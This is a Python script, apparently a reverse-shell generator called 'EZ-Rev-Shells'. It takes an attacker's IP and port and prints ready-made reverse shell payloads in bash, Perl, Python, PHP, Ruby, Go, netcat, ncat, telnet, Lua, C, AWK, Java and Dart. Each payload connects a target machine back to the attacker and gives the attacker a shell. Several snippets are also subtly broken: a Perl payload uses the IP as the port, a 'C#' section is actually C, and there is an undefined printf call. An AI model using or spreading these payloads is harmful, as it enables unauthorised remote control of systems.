print("\n")

print("███████ ███████       ██████  ██████  ██    ██       ███████ ██   ██ ███████ ██      ██      ███████")
print("██         ███        ██   ██      ██ ██    ██       ██      ██   ██ ██      ██      ██      ██     ")
print("█████     ███   █████ ██████   █████  ██    ██ █████ ███████ ███████ █████   ██      ██      ███████")
print("██       ███          ██   ██      ██  ██  ██             ██ ██   ██ ██      ██      ██           ██")
print("███████ ███████       ██   ██ ██████    ████         ███████ ██   ██ ███████ ███████ ███████ ███████")
print("")
print("                                                                      --- Developed by Maruf Murtuza")
print("                                                                                                    ")
print("                                                                      Twitter : @marufmurtuza       ")
print("                                                                      Web     : www.marufmurtuza.ml ")


def main():

    rev_shell_category()

    chosen_category()

    go_back()

def rev_shell_category():

    print("")

    print("What type of shell do you want?")

    print("")

    print("01) TCP Bash Shell")

    print("02) UDP Bash Shell")

    print("03) Perl Shell")

    print("04) Python Shell")

    print("05) PHP Shell")

    print("06) Ruby Shell")

    print("07) Golang Shell")

    print("08) Traditional Netcat Shell")

    print("09) Netcat OpenBsd Shell")

    print("10) Netcat BusyBox Shell")

    print("11) Ncat Shell")

    print("12) Telnet Shell")

    print("13) Lua Shell")

    print("14) C# Shell")

    print("15) AWK Shell")

    print("16) Java Shell")

    print("17) Dart Shell")

    print("")

def tcp_bash_shell():

    print("")

    RHOST = input("RHOST: ")

    print("")

    RPORT = input("RPORT: ")

    print("")

    print("#################### TCP Bash Shell ####################\n")

    print("Shell-01:\n\n    bash -i >& /dev/tcp/"+RHOST+"/"+RPORT+" 0>&1\n")

    print("#########################################################\n")

    print("Shell-02:\n\n    0<&196;exec 196<>/dev/tcp/"+RHOST+"/"+RPORT+"; sh <&196 >&196 2>&196\n")

    print("#########################################################\n")

    print("Shell-03:\n\n    /bin/bash -l > /dev/tcp/"+RHOST+"/"+RPORT+" 0<&1 2>&1\n")

    print("#########################################################")

    print("")

def udp_bash_shell():

    LHOST = input("LHOST: ")

    LPORT = input("LPORT: ")

    print("")

    print("#################### UDP Bash Shell ####################\n")

    print("")

    print("Command for target machine:\n")

    print("    sh -i >& /dev/udp/"+LHOST+"/"+LPORT+" 0>&1\n")

    print("Run a netcat listener on attacker machine:\n")

    print("    nc -u -lvp "+LPORT)

    print("")

    print("#########################################################")

    print("")

def perl_shell():

    IP = input("IP: ")

    PORT = input("PORT: ")

    print("")

    print("###################### Perl Shell ######################\n")

    print("")

    print("Shell-01:\n\n    perl -e 'use Socket;$i=\""+IP+"\";$p="+IP+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n")

    print("#########################################################\n")

    print("Shell-02:\n\n    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\""+IP+":"+PORT+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n")

    print("#########################################################\n")

    print("Shell-03:   (Windows Only)\n\n    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\""+IP+":"+PORT+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n")

    print("#########################################################")

    print("")

def python_shell():

    RHOST = input("\nRHOST: ")

    RPORT = input("RPORT: ")

    print("")

    print("###################### Python Shell ######################\n")


    print("")

    print("Shell-01:   (Linux Only)\n\n    export RHOST=\""+RHOST+"\";export RPORT="+RPORT+";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\""+RHOST+"\"),int(os.getenv(\""+RPORT+"\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n")


    print("Shell-02:   (Linux Only)\n\n    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n")


    print("Shell-03:   (Linux Only)\n\n    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n")


    print("Shell-04:   (Linux Only)\n\n    python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n")

    print("##########################################################\n")

    print("Shell-05:   (Linux Only ; No Spaces)\n\n   python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n")

    print("Shell-06:   (Linux Only ; No Spaces)\n\n   python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n")

    print("Shell-07:   (Linux Only ; No Spaces)\n\n   python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n")

    print("##########################################################\n")

    print("Shell-08:   (Linux Only ; No Spaces ; Shortened)\n\n   python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\""+RHOST+"\","+RPORT+"));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n")

    print("Shell-09:   (Linux Only ; No Spaces ; Shortened)\n\n   python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n")

    print("Shell-10:   (Linux Only ; No Spaces ; Shortened)\n\n   python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\""+RHOST+"\","+RPORT+"));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n")

    print("##########################################################\n")

    print("Shell-11:   (Linux Only ; No Spaces ; Shortened Further)\n\n   python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\""+RHOST+"\","+RPORT+"));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n")

    print("Shell-12:   (Linux Only ; No Spaces ; Shortened Further)\n\n   python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\""+RHOST+"\","+RPORT+"));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n")

    print("Shell-13:   (Linux Only ; No Spaces ; Shortened Further)\n\n   python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\""+RHOST+"\","+RPORT+"));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n")

    print("##########################################################")

    print("")

def php_shell():

    IP = input("IP: ")

    PORT = input("PORT: ")

    print("")

    print("###################### Php Shell ######################\n")

    print("")

    print("Shell-01:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n")

    print("#######################################################\n")

    print("Shell-02:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n")

    print("#######################################################\n")

    print("Shell-03:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");`/bin/sh -i <&3 >&3 2>&3`;'\n")

    print("#######################################################\n")

    print("Shell-04:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");system(\"/bin/sh -i <&3 >&3 2>&3\");'\n")

    print("#######################################################\n")

    print("Shell-05:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");passthru(\"/bin/sh -i <&3 >&3 2>&3\");'\n")

    print("#######################################################\n")

    print("Shell-06:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'\n")

    print("#######################################################\n")

    print("Shell-07:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n")

    print("#######################################################")

    print("")


def ruby_shell():

    IP = input("IP: ")

    PORT = input("PORT: ")

    print("")

    print("###################### Ruby Shell ######################\n")

    print("")

    print("Shell-01:\n\n    ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n")

    print("########################################################\n")

    print("Shell-02:\n\n    ruby -rsocket -e\'exit if fork;c=TCPSocket.new(\""+IP+"\","+PORT+");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: \#{$_}\"}'\n")

    print("########################################################\n")

    print("Shell-03:    (Windows Only)\n\n    ruby -rsocket -e \'c=TCPSocket.new(\""+IP+"\","+PORT+");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'\n")

    print("########################################################")

    print("")

def golang_shell():

    IP = input("IP: ")

    PORT = input("PORT: ")

    print("")

    print("###################### Go Lang. Shell ######################\n")


    printf("")

    print("Shell-01:\n\n    echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+IP+":"+PORT+"\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n\n")

    print("############################################################")

    print("")

def traditional_netcat_shell():

    IP = input("IP: ")

    PORT = input("PORT: ")

    print("")

    print("###################### Traditional Netcat Shell ######################\n")

    print("Shell-01:\n\n    nc -e /bin/sh "+IP+" "+PORT)

    print("")

    print("######################################################################\n")

    print("Shell-02:\n\n    nc -e /bin/bash "+IP+" "+PORT)

    print("")

    print("######################################################################\n")

    print("Shell-03:\n\n    nc -c bash "+IP+" "+PORT)

    print("")

    print("######################################################################")

    print("")

def netcat_openbsd_shell():

    IP = input("IP: ")

    PORT = input("PORT: ")

    print("")

    print("###################### Netcat OpenBsd Shell ######################\n")

    print("")

    print("    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+IP+" "+PORT+" >/tmp/f\n")

    print("##################################################################")

    print("")

def netcat_busybox_shell():

        IP = input("IP: ")

        PORT = input("PORT: ")

        print("")

        print("###################### Netcat BusyBox Shell ######################\n")

        print("")

        print("    rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc "+IP+" "+PORT+" >/tmp/f\n")

        print("##################################################################")

        print("")

def ncat_shell():
        IP = input("IP: ")

        PORT = input("PORT: ")

        print("")

        print("###################### Netcat Shell ######################\n")


        print("")

        print("Shell-01:\n\n    ncat "+IP+" "+PORT+" -e /bin/bash\n")

        print("##########################################################\n")

        print("Shell-02:\n\n    ncat --udp "+IP+" "+PORT+" -e /bin/bash\n")

        print("##########################################################")

        print("")

def telnet_shell():
        LHOST = input("LHOST: ")

        LPORT1 = input("LPORT-01: ")

        LPORT2 = input("LPORT-02: ")

        print("")

        print("###################### Telnet Shell ######################\n")

        print("")

        print("Start two listeners on attacker machine:\n nc -lvp "+LPORT1+"\n nc -lvp "+LPORT2)

        print("")

        print("Run the below command in target machine:\n telnet "+LHOST+" "+LPORT1+" | /bin/sh | telnet"+LHOST+" "+LPORT2)

        print("")

        print("##########################################################")

        print("")

def lua_shell():
        IP = input("IP: ")

        PORT = input("PORT: ")

        print("")

        print("###################### Lua Shell ######################\n")

        print("")

        print("Shell-01:    (Linux Only)\n\n    lua -e \"require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'"+IP+"\',\'"+PORT+"\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');\"\n\n")

        print("#######################################################\n\n")

        print("Shell-02:    (Windows & Linux)\n\n   lua5.1 -e \'local host, port = \""+IP+"\", "+PORT+" local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n")

        print("#######################################################")

        print("")


def c_sharp_shell():
        IP = input("IP: ")

        PORT = input("PORT: ")

        print("")

        print("###################### C# Shell ######################\n")

        print("")

        print("#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>")

        print("int main(void){")

        print("    int port = "+PORT+";")

        print("    struct sockaddr_in revsockaddr;")

        print("    int sockt = socket(AF_INET, SOCK_STREAM, 0);")

        print("    revsockaddr.sin_family = AF_INET;")

        print("    revsockaddr.sin_port = htons(port);")

        print("    revsockaddr.sin_addr.s_addr = inet_addr(\""+IP+"\");")

        print("    connect(sockt, (struct sockaddr *) &revsockaddr,")

        print("    sizeof(revsockaddr));")

        print("    dup2(sockt, 0);")

        print("    dup2(sockt, 1);")

        print("    dup2(sockt, 2);")

        print("    char * const argv[] = {""/bin/sh"", NULL};")

        print("    execve(""/bin/sh"", argv, NULL);")

        print("    return 0;\n}")

        print("")

        print("######################################################")

        print("")


def awk_shell():
        IP = input("IP: ")

        PORT = input("PORT: ")

        print("")

        print("###################### Awk Shell ######################\n")

        print("Shell-01:\n\n    awk \'BEGIN {s = \"/inet/tcp/0/"+IP+"/"+PORT+"\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null\n")

        print("#######################################################")

        print("")



def java_shell():
        IP = input("IP: ")

        PORT = input("PORT: ")

        print("")

        print("###################### Java Shell ######################\n")

        print("Shell-01:\n")

        print("Runtime r = Runtime.getRuntime();")

        print("Process p = r.exec(\"/bin/bash -c \'exec 5<>/dev/tcp/"+IP+"/"+PORT+";cat <&5 | while read line; do $line 2>&5 >&5; done\'\");")

        print("p.waitFor();\n")

        print("#########################################################")

        print("Shell-02:\n")

        print("String host="+IP+";\nint port="+PORT+";\nString cmd=\"cmd.exe\";")

        print("Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n")

        print("#########################################################")

        print("")


def dart_shell():
        IP = input("IP: ")

        PORT = input("PORT: ")

        print("")

        print("###################### Dart Shell ######################\n")

        print("Shell-01:\n")

        print("import 'dart:io';")

        print("import 'dart:convert';")

        print("main() {")

        print("  Socket.connect("+"\""+IP+"\""+", "+PORT+").then((socket) {")

        print("    socket.listen((data) {")

        print("      Process.start('powershell.exe', []).then((Process process) {")

        print("        process.stdin.writeln(new String.fromCharCodes(data).trim());")

        print("        process.stdout")

        print("          .transform(utf8.decoder)")

        print("          .listen((output) { socket.write(output); });")

        print("      });")

        print("    },")

        print("    onDone: () {")

        print("      socket.destroy();")

        print("    });")

        print("  });")

        print("}")

        print("")

        print("#########################################################")

        print("")


def chosen_category():

    cat_num = input("Input the number of your desired shell type: ")

    if cat_num == " " or cat_num == "":
        print("Please enter a valid number from the shown list above.")

    elif cat_num == "01" or cat_num == "1":
        tcp_bash_shell()

    elif cat_num == "02" or cat_num == "2":
        udp_bash_shell()

    elif cat_num == "03" or cat_num == "3":
        perl_shell()

    elif cat_num == "04" or cat_num == "4":
        python_shell()

    elif cat_num == "05" or cat_num == "5":
        php_shell()

    elif cat_num == "06" or cat_num == "6":
        ruby_shell()

    elif cat_num == "07" or cat_num == "7":
        golang_shell()

    elif cat_num == "08" or cat_num == "8":
        traditional_netcat_shell()

    elif cat_num == "09" or cat_num == "9":
        netcat_openbsd_shell()

    elif cat_num == "10" or cat_num == "10":
        netcat_busybox_shell()

    elif cat_num == "11" or cat_num == "11":
        ncat_shell()

    elif cat_num == "12" or cat_num == "12":
        telnet_shell()

    elif cat_num == "13" or cat_num == "13":
        lua_shell()

    elif cat_num == "14" or cat_num == "14":
        c_sharp_shell()

    elif cat_num == "15" or cat_num == "15":
        awk_shell()

    elif cat_num == "16" or cat_num == "16":
        java_shell()

    elif cat_num == "17" or cat_num == "17":
        dart_shell()


def go_back():
    goback_ans = input("Do you want to go back to main menu? (Y/N) : ")

    if goback_ans == "Y" or goback_ans == "y" or goback_ans == "YES" or goback_ans == "yes":
        main()
    else:
        print("")
        print("Goodbye! Hope to see you again...\n")

main()
